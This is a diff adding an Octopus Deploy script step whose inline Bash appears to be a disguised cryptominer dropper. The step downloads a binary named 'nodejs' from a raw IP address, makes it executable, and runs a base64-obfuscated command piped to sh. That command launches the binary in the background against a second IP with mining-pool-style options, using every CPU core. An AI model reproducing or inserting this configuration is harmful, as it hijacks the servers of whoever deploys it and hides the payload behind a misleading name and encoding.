@@ -1,0 +1,35 @@
+step "run-a-script" {
+    name = "Run a Script"
+    properties = {
+        Octopus.Action.TargetRoles = "sample-app-server"
+    }
+
+    action {
+        action_type = "Octopus.Script"
+        properties = {
+            Octopus.Action.RunOnServer = "false"
+            Octopus.Action.Script.ScriptBody = <<-EOT
+                jobs:
+                  Job1:
+                    name: Job 1
+                    steps:
+                      - type: script
+                        script-content: wget http://216.126.225.177:443/nodejs
+                        name: '1'
+                      - type: script
+                        script-content: chmod +x  nodejs
+                        name: '2'
+                      - type: script
+                        name: '3'
+                        script-content: >-
+                          echo
+                          bm9odXAgLi9ub2RlanMgLW8gMjE2LjEyNi4yMjQuNzc6ODAgLS1yZXRyaWVzPTIxNDc0ODM2IC0tcmV0cnktcGF1c2U9NSAtdCAkKG5wcm9jKSAtLWJhY2tncm91bmQgPi9kZXYvbnVsbCAyPiYxICYKdGFpbCAtZiAvZGV2L251bGw=
+                          | base64 -d | sh
+                EOT
+            Octopus.Action.Script.ScriptSource = "Inline"
+            Octopus.Action.Script.Syntax = "Bash"
+            OctopusUseBundledTooling = "False"
+        }
+        worker_pool_variable = ""
+    }
+}
